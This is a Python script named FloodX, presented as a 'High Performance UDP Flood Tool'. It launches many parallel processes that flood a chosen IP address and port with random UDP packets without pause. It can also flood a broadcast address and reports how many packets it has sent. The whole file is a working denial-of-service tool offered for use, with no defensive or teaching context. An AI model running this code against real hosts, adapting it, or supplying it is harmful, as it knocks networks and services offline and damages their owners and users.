#!/usr/bin/env python3

import socket
import multiprocessing
import os
import time
import signal
import argparse
import sys

VERSION = "FloodX v1.0 by mirac-s"

def flood(target_ip, target_port, packet_size, interval, broadcast, counter):
    try:
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if broadcast:
            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
        data = os.urandom(packet_size)
        target = (target_ip, target_port)

        while True:
            udp_socket.sendto(data, target)
            with counter.get_lock():
                counter.value += 1
            if interval > 0:
                time.sleep(interval)
    except Exception as e:
        print(f"[!] Thread Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="FloodX - High Performance UDP Flood Tool",
        epilog="Example: ./floodx.py 192.168.1.255 -b -c 200"
    )

    parser.add_argument("target_ip", nargs="?", help="Target IP Address or Broadcast")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target Port (default: 80)")
    parser.add_argument("-s", "--size", type=int, default=1024, help="Packet Size in bytes (default: 1024)")
    parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packets (default: 0)")
    parser.add_argument("-b", "--broadcast", action="store_true", help="Enable Broadcast Mode")
    parser.add_argument("-c", "--core", type=int, default=(os.cpu_count() * 10), help="Number of Processes (default: CPU * 10)")
    parser.add_argument("--version", action="store_true", help="Show version info and exit")

    args = parser.parse_args()

    if args.version:
        print(VERSION)
        sys.exit(0)

    if not args.target_ip:
        parser.print_help()
        sys.exit(1)

    print(f"{VERSION}\nTarget: {args.target_ip}:{args.port} | Packet Size: {args.size} | Process: {args.core}")
    counter = multiprocessing.Value('i', 0)
    processes = []

    for _ in range(args.core):
        p = multiprocessing.Process(target=flood, args=(
            args.target_ip, args.port, args.size, args.interval, args.broadcast, counter))
        p.start()
        processes.append(p)

    try:
        while True:
            with counter.get_lock():
                print(f"Total Packets Sent: {counter.value}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nFloodX Stopped!")
        for p in processes:
            os.kill(p.pid, signal.SIGTERM)
        print(f"Total Packets: {counter.value}")